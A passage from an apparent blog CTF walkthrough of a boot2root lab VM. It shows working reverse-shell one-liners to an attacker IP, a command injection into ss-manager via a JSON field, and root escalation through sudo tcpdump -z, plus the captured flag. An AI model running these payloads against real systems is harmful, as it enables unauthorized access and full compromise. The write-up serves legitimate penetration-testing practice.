&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then to get a reverse shell we need to set up a netcat listener in this case on port 443 and then execute the following curl request.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://192.168.179.177:443?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;urlencode &lt;span class=&quot;s1&quot;&gt;'bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.179.1/443 0&amp;gt;&amp;amp;1&quot;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a reverse shell with nodeadmin user privileges.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.177] 38956
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;820&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty;pty.spawn('/bin/bash')&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By listing the procesess &lt;strong&gt;ss-manager&lt;/strong&gt; is running as user fireman, googling I found that it is a controller for multi-user management and traffic statistics, also this version is vulnerable to command execution, the exploit can be downloaded &lt;a href=&quot;https://www.exploit-db.com/exploits/43006&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
ps aux | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
root       812  0.0  0.8 301464  4420 ?        S    23:41   0:00 su fireman &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/local/bin/ss-manager
fireman    829  0.0  0.7  37060  3876 ?        Ss   23:41   0:00 /usr/local/bin/ss-manager
nodeadm+  1042  0.0  0.2 213788  1044 ?        S    23:45   0:00 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto fireman
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the specifications of the exploit, this must be run under the UDP port 8833, by listing the servicess we can verify that it is running on the specified port.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ss &lt;span class=&quot;nt&quot;&gt;-ntlu&lt;/span&gt;
ss &lt;span class=&quot;nt&quot;&gt;-ntlu&lt;/span&gt;
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port  
...
udp    UNCONN   0        0               127.0.0.1:8839           0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the attacking machine we start a netcat listener on port 1337, then on the victim machine we connect to UDP port 8839 and we run the following command to get a shell from the target machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
Ncat: Version 7.60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Ncat: Connected to 127.0.0.1:8839.
add: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:8003, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;||bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.179.1/1337 0&amp;gt;&amp;amp;1'||&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we have a shell as user fireman.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] 52707
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;848&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fireman&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fireman&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fireman&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This user has enabled run some binaries with sudo permissions, we will abuse tcpdump to escalate to root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fireman on localhost:
    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY&quot;&lt;/span&gt;,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User fireman may run the following commands on localhost:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmcli
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/tcpdump
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;

&lt;p&gt;An awesome guide how to exploit this you can find it &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tcpdump/#sudo&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First we write a reverse shell into a file and give it execution permissions.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'nc 192.168.179.1 8081 -e /bin/bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/r00t
&amp;lt;ho &lt;span class=&quot;s1&quot;&gt;'nc 192.168.179.1 8081 -e /bin/bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/r00t
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/r00t
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/r00t
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we set up a netcat listener and run the following command to get a reverse shell as user root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/r00t &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
&amp;lt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/r00t &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
tcpdump: listening on eth0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
0 packets dropped by kernel
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see now we are root and we can read the root flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 8081  
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8081 ...         
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] 33895
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null                        
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;flag.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] You&lt;span class=&quot;s1&quot;&gt;'re a soldier.
[+] One of the best that the world could set against
[+] the demonic invasion.

+-----------------------------------------------------------------------------+
| |       |\                                           -~ /     \  /          |
|~~__     | \                                         | \/       /\          /|
|    --   |  \                                        | / \    /    \     /   |
|      |~_|   \                                   \___|/    \/         /      |
|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
|  __--P :  |  /                                /  /  | \     /  \          /\|
|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
|    |      |/                        .-.             |  /\          \  /     |
|    |      /                        |   |            |/   \          /\      |
|    |     /                        |     |            -_   \       /    \    |
+-----------------------------------------------------------------------------+
|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
+-----------------------------------------------------------------------------+

                FLAG: kre0cu4jl4rzjicpo1i7z5l1

[+] Congratulations on completing this VM &amp;amp; I hope you enjoyed my first boot2root.

[+] You can follow me on twitter: @0katz

[+] Thanks to the homie: @Pink_P4nther
[root@localhost ~]#
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: A CTF machine intended to improve skills in penetration testing.</summary></entry></feed>